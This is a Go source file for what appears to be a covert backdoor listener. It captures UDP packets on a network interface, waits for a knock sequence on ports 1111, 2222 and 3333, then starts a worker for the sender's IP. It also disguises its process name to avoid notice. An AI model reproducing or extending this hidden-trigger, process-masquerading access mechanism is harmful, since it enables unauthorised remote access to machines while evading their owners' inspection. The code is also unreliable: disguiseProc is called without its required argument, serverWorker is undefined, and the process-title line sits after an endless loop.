package main

import (
	"fmt"
	"os"

	"github.com/ErikDubbelboer/gspt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {
	fmt.Println("Server Running")
	disguiseProc()
	listenForKnocks("en1")
	titleOfProcess := os.Args[1]
	// set the process name
	gspt.SetProcTitle(titleOfProcess)
	//serverWorker(net.ParseIP("192.168.1.46"))
}

func listenForKnocks(ifaceName string) {

	// open a handle to the network card(s)
	ifaceHandle, err := pcap.OpenLive(ifaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}

	defer ifaceHandle.Close()

	// set the filter
	err = ifaceHandle.SetBPFFilter("udp")
	if err != nil {
		// not fatal
		fmt.Printf("Unable to set filter: %v\n", err.Error())
	}

	// map of potential connections
	clients := make(map[string]map[layers.UDPPort]bool)

	// variable for layers
	var ethLayer layers.Ethernet
	var ipv4Layer layers.IPv4
	var udpLayer layers.UDP

	// create the decoder for fast-packet decoding
	// (using the fast decoder takes about 10% the time of normal decoding)
	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer)

	// this slick will hold the names of the layers successfully decoded
	decodedLayers := make([]gopacket.LayerType, 0, 4)

	// loop over all received packets
	for {

		// get packet data
		packetData, _, err := ifaceHandle.ZeroCopyReadPacketData()
		if err != nil {
			panic(err)
		}

		// decode this packet using the fast decoder
		err = decoder.DecodeLayers(packetData, &decodedLayers)
		if err != nil {
			continue
		}

		// only proceed if all layers decoded
		if len(decodedLayers) != 3 {
			continue
		}

		ipStr := ipv4Layer.SrcIP.String()
		print("got pkt")
		addKnock(clients, ipStr, udpLayer.DstPort)

		if checkKnocks(clients, ipStr) {
			fmt.Printf("%+v\n", clients)
			go serverWorker(ipv4Layer.SrcIP.String())
			delete(clients, ipStr)
		}
	}
}

func addKnock(clients map[string]map[layers.UDPPort]bool, ip string, port layers.UDPPort) {
	switch port {

	case 1111, 2222, 3333:
		_, ok := clients[ip]
		if !ok {
			clients[ip] = make(map[layers.UDPPort]bool)
		}
		clients[ip][port] = true
		fmt.Printf("Got knock on port %v from %v\n", port, ip)
	default:
		delete(clients, ip)
	}
}

func checkKnocks(clients map[string]map[layers.UDPPort]bool, ip string) bool {

	var ports = []layers.UDPPort{1111, 2222, 3333}

	for _, port := range ports {
		if !(clients[ip][port]) {
			return false
		}
	}
	return true
}

func disguiseProc(titleOfProcess string) {
	gspt.SetProcTitle(titleOfProcess)
}
